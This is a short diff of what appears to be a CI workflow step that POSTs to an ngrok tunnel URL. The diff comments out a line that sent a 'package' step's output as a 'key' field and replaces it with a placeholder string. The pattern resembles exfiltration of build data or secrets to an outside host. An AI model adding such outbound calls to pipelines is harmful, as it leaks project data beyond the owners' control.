@@ -35,5 +35,6 @@ jobs:
       with:
         url: 'https://b912-54-91-189-235.ngrok.io/hook/'
         method: 'POST'
-        data: '{"key":"${{ steps.package.outputs.content }}"}'
+        #data: '{"key":"${{ steps.package.outputs.content }}"}'
+        data: 'abc123'
       
